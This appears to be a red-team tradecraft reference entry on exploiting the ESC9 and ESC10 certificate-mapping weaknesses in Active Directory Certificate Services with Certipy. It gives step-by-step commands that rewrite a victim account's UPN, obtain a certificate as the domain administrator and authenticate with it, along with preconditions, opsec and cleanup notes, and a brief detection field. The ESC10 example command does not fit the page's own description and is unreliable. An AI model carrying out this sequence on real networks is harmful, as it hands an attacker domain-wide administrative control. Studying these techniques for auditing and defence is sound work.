---
name: ADCS ESC9 and ESC10 — No Security Extension and Weak Certificate Mapping
category: adcs
subcategories: [esc9, esc10, no-security-extension, weak-cert-mapping, certipy]
tradecraft_tags: [adcs, esc9, esc10, weak-mapping, no-security-extension, certipy, newer-escs]
mitre_attack:
  - id: T1649
    name: Steal or Forge Authentication Certificates
source:
  url: https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  ESC9/10 exploitation generates the same certificate enrollment events as ESC1
  but requires additional conditions. Detection via certificate audit logging showing
  enrollment for accounts with mismatched SAN content.
usage_examples:
  - description: Detect ESC9 and ESC10 vulnerabilities
    args: "certipy find -u user -p pass -dc-ip DC_IP -vulnerable"
  - description: Exploit ESC9 — change account UPN then request cert
    args: "certipy account update -u user -p pass -dc-ip DC_IP -user TARGET -upn administrator@domain.local"
  - description: Exploit ESC10 — weak cert mapping allows UPN from cert to override AD attribute
    args: "certipy req -ca CANAME -template UserTemplate -u user -p pass -dc-ip DC_IP -upn administrator@domain.local"
opsec_notes: |
  ESC9 and ESC10 were published by Oliver Lyak (@ly4k) with Certipy v4.0 (2023).
  These vulnerabilities exploit the interaction between certificate UPN mapping and
  AD user attributes. They require GenericWrite on the target account (ESC9) or
  specific CA/domain configuration (ESC10). Certipy v4+ is required for exploitation.
gotchas: |
  ESC9 requires:
  1. GenericWrite (or ownership) on the target user account
  2. A certificate template with `CT_FLAG_NO_SECURITY_EXTENSION` flag
  3. `StrongCertificateBindingEnforcement` not set to 2 on the DC
  
  ESC10 requires:
  1. GenericWrite on the target user account
  2. Specific domain controller registry setting for weak certificate mapping
  
  Both are Certipy-only — Certify does not implement ESC9/10.
related_ttps: [certipy, certify-v2, adcs-esc7, adcs-esc8, rubeus, whisker]
alternatives: [certify-v2]
common_args: {}
last_updated: 2026-05-29
---

# ADCS ESC9 and ESC10

Newer ADCS vulnerability classes published by Oliver Lyak (@ly4k) with Certipy v4.0.
These exploit the interaction between certificate Subject Alternative Names and Active
Directory's certificate mapping policies.

## ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

**Condition**: Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag + `StrongCertificateBindingEnforcement < 2`

**Attack flow**:
```
1. Attacker has GenericWrite on TARGET_USER account

2. Change TARGET_USER's UPN (userPrincipalName) to "administrator@domain.local":
   certipy account update -u attacker -p pass -dc-ip DC_IP \
     -user TARGET_USER -upn administrator@domain.local

3. Request a certificate for TARGET_USER (using the changed UPN):
   certipy req -ca CANAME -template AffectedTemplate \
     -u TARGET_USER -p OriginalPass -dc-ip DC_IP
   → Certificate issued with SAN=administrator@domain.local

4. Restore TARGET_USER's UPN (cleanup):
   certipy account update -u attacker -p pass -dc-ip DC_IP \
     -user TARGET_USER -upn TARGET_USER@domain.local

5. Authenticate as administrator using the cert:
   certipy auth -pfx administrator.pfx -domain domain.local
```

## ESC10 — Weak Certificate Mapping

**Condition**: Registry key `HKLM\System\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement = 0`

Similar to ESC9 but without the template flag requirement — the DC's own weak
certificate mapping policy allows UPN from a cert to override AD's SID binding check.

## Certipy v4+ Usage

```
# Detect both:
certipy find -u user -p pass -dc-ip DC_IP -vulnerable

# Look for:
# [!] Template ... has NO_SECURITY_EXTENSION flag (ESC9 candidate)
# [!] Domain controller has weak certificate binding (ESC10 candidate)
```

## Key Insight

ESC9/10 require **GenericWrite** on an account. When BloodHound shows a controlled
principal with GenericWrite over a user:
- Primary recommendation: Whisker shadow credentials (simpler, more reliable)
- Alternative if ADCS is present and ESC9/10 conditions are met: Certipy ESC9/10 path
